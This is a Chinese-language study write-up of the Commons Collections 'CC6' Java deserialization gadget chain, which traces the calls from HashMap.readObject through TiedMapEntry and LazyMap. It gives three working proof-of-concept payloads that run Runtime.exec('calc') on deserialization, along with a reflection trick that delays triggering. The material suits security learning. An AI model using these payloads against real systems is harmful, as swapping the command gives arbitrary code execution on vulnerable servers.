CC1的两条利用链，在JDK 8u71之后已修复，不可利用。

学一下不受版本限制的CC6利用链

# 分析版本

Commons Collections 3.2.1

JDK 8u65

环境配置参考[JAVA安全初探(三):CC1链全分析](https://xz.aliyun.com/t/12669?time__1311=mqmhDvqIxfgD8DlxGo4%2bxCw67o7KKG=z4D&amp;alichlgref=https://www.google.com/)

# 分析过程

CC6是在CC1 LazyMap利用链(引用)的基础上。

与其不同的是在寻找CC1 LazyMap.get的利用时，找到的是TiedMapEntry的getValue方法。

TiedMapEntry又是个public类，并且可序列化，可以控制map和key的传值。

```java
    public Object getValue() {
        return map.get(key);
    }
```

而getValue又被hashCode调用

```java
    public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
               (value == null ? 0 : value.hashCode()); 
    }
```

之后找hashCode的调用，作者找到的是HashMap的hash方法

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

我们又知道HashMap是可序列化的，还重写了readObject，看下readObject方法

```java
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);
        @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}
```

可以看到`putVal(hash(key), key, value, false, false);`正好调用了hash函数，只要保证反序列化时mapping的值大于0，就能走到这一步。

到此利用链完成。

Poc

```java
public class cc6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer("1")
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
        
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 1);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, 1);
        cc1_poc.serialize(hashMap);
        cc1_poc.unserialize("s.ser");
    }
}
```

此时可以弹计算器，但是计算器是在`hashMap.put(tiedMapEntry, 1);`这步（序列化之前）时，就把利用链调完了，所以参考URLDNS利用链

[11111]: https://blog.csdn.net/weixin_45436292/article/details/140068299?spm=1001.2014.3001.5501

的解决办法。

因为是在put处触发的，所以我们在写完利用链之后，调用put之前，通过反射把利用链断掉。

在put方法调用之后，序列化之前，再把修改的位置复原。

更新Poc

```java
public class cc6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer("1")
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
        //断掉利用链 TiedMapEntry, LazyMap, ChainedTransformer都可以
        //举个例子修改tiedMapEntry的 key
        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(), 1);

        HashMap<Object, Object> hashMap = new HashMap<>();

        hashMap.put(tiedMapEntry, 1);

        //复原
        //因为key为private，而且也没有public方法能直接修改key
        //利用反射
        Class c = TiedMapEntry.class;
        Field key = c.getDeclaredField("key");
        key.setAccessible(true);
        key.set(tiedMapEntry, lazyMap);

        cc1_poc.serialize(hashMap);
        cc1_poc.unserialize("s.ser");
    }
}
```

# 补充

如果在断掉利用链时选择修改LazyMap，会发现反序列化也不会触发计算器，是因为put过程中

走到LazyMap.get这，if表达式为真，会执行到map.put(key, value);

而map在序列化时会被序列化，在反序列化时map里面有了key，if表达式为假，不会执行chainedTransformer.transform，利用链断了。

解决这个问题，在put后序列化之前把lazyMap map中对应的key删掉就好了，详情参考[Java反序列化CommonsCollections篇(二)-最好用的CC链_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788&vd_source=686636e30f91f8a12e28751943870859)

**虽然map是用transient修饰的，但是在LazyMap中通过自定义 writeObject 和 readObject 方法将map序列化。**

```java
    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
        out.writeObject(map);
    }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        map = (Map) in.readObject();
    }

    //-----------------------------------------------------------------------
    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

# 补充2

看下后半个链

```java
Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer); // Map Transformer

TiedMapEntry tiedMapEntry = new TiedMapEntry(LazyMap, 1); //Map key
```

TiedMapEntry.getValue 调用 LazyMap.get(1)

```java
    public Object getValue() {
        return map.get(key);
    }
```

之后调用factory.transform(key)，也就是chainedTransformer.transform(1)。

之前我们这里1是随便写的值，因为chainedTransformer的Transformers数组的第一个元素是new ConstantTransformer(Runtime.class)，ConstantTransformer.transform(任意值)==Runtime.class。

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);  //chainedTransformer.transform(1)
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

看到上面的分析，其实能发现chainedTransformer.transform()方法是可以传值的和其他链不一样。

我们把TiedMapEntry tiedMapEntry = new TiedMapEntry(LazyMap, 1); //Map key 的key传入Runtime.class也是可以的

Poc

```java
public class cc6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                //new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer("1")
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
        //断掉利用链 TiedMapEntry, LazyMap, ChainedTransformer都可以
        //举个例子修改tiedMapEntry的 key
        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(), Runtime.class);

        HashMap<Object, Object> hashMap = new HashMap<>();

        hashMap.put(tiedMapEntry, 1);

        //复原
        //因为key为private，而且也没有public方法能直接修改key
        //利用反射
        Class c = TiedMapEntry.class;
        Field key = c.getDeclaredField("map");
        key.setAccessible(true);
        key.set(tiedMapEntry, lazyMap);

        cc1_poc.serialize(hashMap);
        cc1_poc.unserialize("s.ser");
    }
}
```
